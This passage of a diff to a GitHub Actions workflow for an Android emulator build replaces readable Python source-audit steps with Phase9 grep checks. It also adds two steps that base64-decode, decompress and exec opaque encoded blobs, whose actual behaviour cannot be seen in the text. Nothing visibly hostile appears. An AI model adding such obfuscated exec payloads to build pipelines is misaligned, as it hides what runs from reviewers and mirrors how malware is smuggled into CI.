+          python3 -c "import base64,zlib;exec(compile(zlib.decompress(base64.b64decode('eNqlVV2P4jYUfedXuE+BahJ22+nDjrqVsmA6aBmIgI62QsgyzgUsEse1DQsazX+vbQhkZmHZDx5IbN9zfHx978lcFTmS1CwzPkM8l4UyKLHDmkLv/Us9iIJGbc4z0HbmqYbsL1gommYQ3KGAStmcrXmWRoe5m0OEXJfLWrFmTrloMjdY7TIuoGnXIzsuw42i3OhriKYPIzkVdAEqWh7RsDVrBdfh+7jyWRWwhEyCuspAjaFsmYMwZA6Qzihbkawo5EkLg+VVFi4MKFYIAcw0WZHbA6UEtsDWplBVKvaTVJUDSi7Bob6fsRDNEhxxwUrCnG4/Q5Z9H98BRH5PK69VmaJIQf9gBj32lD4//BmmiqyFpFeZbAPIJWealNkiVGvIZxmUF/Fcc5Xn2mh1h+oKNdGmESmgKXHz9QaaFwqtbtAGcYF8y0XcQK7rjecan6NgA0rzQrSsOvTH2wCJwrhIB56UPTlFliN4E/0W3b4NGc1DuaQa3oXa1kN+G54KOCwLOHQFHM75NpRmpi6w3vk82PbTgEY7bVXhLTf1IPHs6KAM8dQyc7NDOdeai4W1DgX/rbmC9OQex2afBHotneXo+Circ1DVs6J6dFesTTB94SmT4PEjwZ/G5FIvkmwPu0HB4ypZ7jRnNGvDhjP42jYdoM4UtKV20AkehaPbsINx+0Pc+hi24mR6VHIyHK+m+xD/jck/I/cfj8dx6/4B98ekxJLeYJCQD90xucDt8Sf2oxdNAnwmM0MqFqAHNuUZlY7uXFDvmANNc5lB2s2tZ6Jf3iM7LdfGD4877k1rEozAnE/RwIO04xuCLrINjCq0r+5p71uTL47ZxqPW9JLgl6eafulak8s71w/30TjiTuY0CUB3CsWgs85sFWimuLSt4I9y9bjT165kK1ZS8ed4v98jh8/o179QNcWvQGWJtHGC+23cb/377WUxTHy25i+u1J6l0hC05E+6Ce51+5i0hjge28egNxh+UzGeAVux43syGlu53d51kqlzNm9dsLtBpliB0M5Bys4vTWzvIS7Qx3iT8cH7BfezLrdfq5qQpZ2eQs760Lw0ooPvoCdP8+w4nryTepZn60d2C0fu7TfAD3gY99okuY9H+B1JhoNH3I/7LRzladCIYMu1OSq/6H5SFRsQVDCo+J5U9tNS95fa6k7RIfSF6SJWKGW/O845maVQrkXtg8852O1r/wPIOS+X')), '<verify>', 'exec'))"
 
-          # FIX4 compile-prerequisite audit. Direct access to GPU members requires the
-          # complete GPU definition, not only `class GPU;`.
-          for key in ['tm', 'f2d', 'tic', 'tc', 'cec', 'present']:
-              if '#include <gpu.h>' not in text[key]:
-                  raise SystemExit(f'FIX4 GPU completeness missing in {files[key]}')
-          print('[ES-FIX4] complete GPU type verified for all direct Phase8 GPU users')
-
-          if '[ES-S4-FEEDBACK]' not in text['cec']: raise SystemExit('feedback-loop correlation trace missing')
-          if '[ES-S4-BIND]' not in text['tic']: raise SystemExit('TIC bind trace missing')
-          if '[ES-S4-FERMI2D]' not in text['f2d']: raise SystemExit('Fermi2D trace missing')
-          if '[ES-S4-DMA]' not in text['dma']: raise SystemExit('DMA trace missing')
-          if '[ES-S4-FRAME]' not in text['present']: raise SystemExit('presentation frame trace missing')
-          if not (r/'EMERALD_PHASE8_PROVENANCE.md').exists(): raise SystemExit('Phase8 provenance missing')
-          print('[ES-CI] Phase8 black-box diagnostic coverage verified')
-          PY
-
-      - name: CAM Phase8 regression and correctness audit
+      - name: CAM Phase9 regression safety audit
         working-directory: ${{ env.ES_SOURCE_DIR }}
         run: |
           set -euo pipefail
-          python3 - <<'PY'
-          from pathlib import Path
-          r=Path('.')
-          fermi=(r/'app/src/main/cpp/skyline/gpu/interconnect/fermi_2d.cpp').read_text()
-          pipeline=(r/'app/src/main/cpp/skyline/gpu/interconnect/common/pipeline.inc').read_text()
-          textures=(r/'app/src/main/cpp/skyline/gpu/interconnect/common/textures.cpp').read_text()
-          shader=(r/'app/src/main/cpp/skyline/gpu/shader_manager.cpp').read_text()
-          prefs=(r/'app/src/main/res/xml/emulation_preferences.xml').read_text()
-          native=(r/'app/src/main/java/org/stratoemu/strato/settings/NativeSettings.kt').read_text()
-          if 'const float esHelperScaleY{dvDy < 0.0f ? -dvDy : dvDy};' not in fermi: raise SystemExit('Storm4 Fermi2D FlipY missing')
-          if 'size_t sizeOverride{std::min<size_t>(cbufSizes[idx], view.size)};' not in pipeline: raise SystemExit('correct CBuffer min clamp missing')
-          if 'support_descriptor_aliasing = descriptorAliasingSupported' not in shader: raise SystemExit('Phase5 descriptor safety missing')
-          for key in ['use_asynchronous_shaders','anisotropy_mode','dma_accuracy','vram_usage_mode']:
-              if key not in prefs: raise SystemExit('graphics setting missing: '+key)
-          for token in ['var anisotropyMode : Int','var dmaAccuracy : Int','pref.vramUsageMode == 1']:
-              if token not in native: raise SystemExit('Phase6 NativeSettings plumbing missing: '+token)
-          unsafe='if (cached.sequenceNumber == ctx.channelCtx.channelSequenceNumber)\n                return cached.view;'
-          if unsafe in textures: raise SystemExit('unsafe same-sequence-only TextureView reuse returned')
-          if 'esTicEqual && !esReplaced && (esSameSequence || !cached.transientNull)' not in textures: raise SystemExit('Phase7 TIC correctness fix missing')
-          if 'ResolveSampledFeedback(texture)' in pipeline: raise SystemExit('rejected feedback snapshot routing re-enabled')
-          print('[ES-CI] Phase8 regression/correctness audit passed')
-          PY
+          python3 -c "import base64,zlib;exec(compile(zlib.decompress(base64.b64decode('eNqdlduO2zYQhu/3KeZONhpLaZCL1sm22OwBDYomQZUUKLYLYUyObMYiqQ4px06Qd+9QkuPsZl0E6xvxMPzn4xzomr2FFuOqMQswtvUc4Y1MTxhO+8Eky7PpSU1sjaxMGArIsG2LwKqwaFyh0mS9a4yjYtl2hXGRWHnnSMWiP1c90blYZdOcCXUVaRsn05PWtJQOPUBVeWu9K/YKuXHqjnj6dEzh4eJ7hXvIwwo18fdJD7aVRYdL4vvCwFQfwRTvxdY2BdmuwWi8q5IxMTklXLJzR8qJ0eZIPN/jBgvPyyJExuhFchwVgWI0bhmKV/3xcpzm63hHXpF6YDjR6Yq2pLro7wuBqSET8xChbjxGoPAbNS1xqbChvz/pzcUOnsPj/HENv8Ksn84hfT4/y8D5CMZBX2jzE5AfowkE5S5EspdbEydZKX7tU7hKNk8uQHlmQZOAAtNSohxIZwNGMB+pipA+rzfEbDR9ClHP59a458PmLxO16OpSxuHa6O3NI9gY+pCnzelXQPviPMZ0/qKrBRpEGFSDtv2WpWtTO1aagmLTyh0qbAwGyY7k4bB6Ni6Wg72c3zMMxXeM4KAAAWuKu1sEtSyvaZdkrrMuUIVh59SKvfNdqAblkD2SUnAm+Mi+3VXWa0pL2mKFSnWMapfmG0ZbdUE6YDC5GZDkksnDPmCpEYaN+3mXjO3KqABjxUroQrr3HDL4ISkN0NGvyQ3YG2Q44P0hrqVwXrrYM8mecJ6NmIeNxJEn4ncJuD90ego/fgU9eBixh6b7P+7bfQVt09nFN/i95pD368tyVj6dXV1eXrw4O//95ks6pQGP5fLNCgP9JF1AeoFqDRIIcsEoaPzyVlo7l3It9ZOJq4lCtSKdB/q3S4/KKyFLD9spqLjN1QqlhZvzw7C8ZTf9x8GdH5O8mQI6yKa+eJalO41e5Q77Z/XYRUbLgJZmeyx4Oxz6S/TEhRTj6OhLq/xJwTcSY2mjhvTVGIXJ6GyafU9DMr2XR4H0IYjBYRtWEnv2XV9wTDNyuGh6vy3LOzfps3X+8gb6DPy8j3V6W7DTJsp/6xj5/wAWvZDk')), '<audit>', 'exec'))"
 
-      - name: FIX4 prove generated C++ before compilation
+      - name: Phase9 prove generated correction before compilation
         working-directory: ${{ env.ES_SOURCE_DIR }}
         run: |
           set -euo pipefail
-          echo "[ES-FIX4] texture_manager.cpp GPU include:"
-          grep -nF '#include <gpu.h>' app/src/main/cpp/skyline/gpu/texture_manager.cpp
-          echo "[ES-FIX4] Phase8 TextureManager diagnostic access:"
-          grep -nF 'gpu.storm4TextureForensics' app/src/main/cpp/skyline/gpu/texture_manager.cpp | head -n 3
-          echo "[ES-FIX4] compile prerequisite proof passed"
+          echo "[ES-PHASE9] capability:"
+          grep -nF 'supportsAttachmentFeedbackLoopLayout' app/src/main/cpp/skyline/gpu/trait_manager.h
+          echo "[ES-PHASE9] descriptor layout:"
+          grep -nF 'ResolveSampledImageLayout(texture)' app/src/main/cpp/skyline/gpu/interconnect/common/pipeline.inc
+          echo "[ES-PHASE9] render-pass feedback dependency:"
+          grep -nF 'VK_DEPENDENCY_FEEDBACK_LOOP_BIT_EXT' app/src/main/cpp/skyline/gpu/interconnect/command_nodes.cpp
+          echo "[ES-PHASE9] pipeline flags:"
+          grep -nF 'VK_PIPELINE_CREATE_COLOR_ATTACHMENT_FEEDBACK_LOOP_BIT_EXT' app/src/main/cpp/skyline/gpu/graphics_pipeline_assembler.cpp
+          echo "[ES-PHASE9] correction proof passed"
 
       - name: Build Emerald Storm APK
         working-directory: ${{ env.ES_SOURCE_DIR }}
@@ -508,6 +97,7 @@ jobs:
           cp EMERALD_PHASE6_PROVENANCE.md ../EMERALD_PHASE6_PROVENANCE.md
           cp EMERALD_PHASE7_PROVENANCE.md ../EMERALD_PHASE7_PROVENANCE.md
           cp EMERALD_PHASE8_PROVENANCE.md ../EMERALD_PHASE8_PROVENANCE.md
+          cp EMERALD_PHASE9_PROVENANCE.md ../EMERALD_PHASE9_PROVENANCE.md
 
       - name: Upload APK
         uses: actions/upload-artifact@v4
@@ -520,5 +110,6 @@ jobs:
             EMERALD_PHASE6_PROVENANCE.md
             EMERALD_PHASE7_PROVENANCE.md
             EMERALD_PHASE8_PROVENANCE.md
+            EMERALD_PHASE9_PROVENANCE.md
           if-no-files-found: error
           retention-days: 30
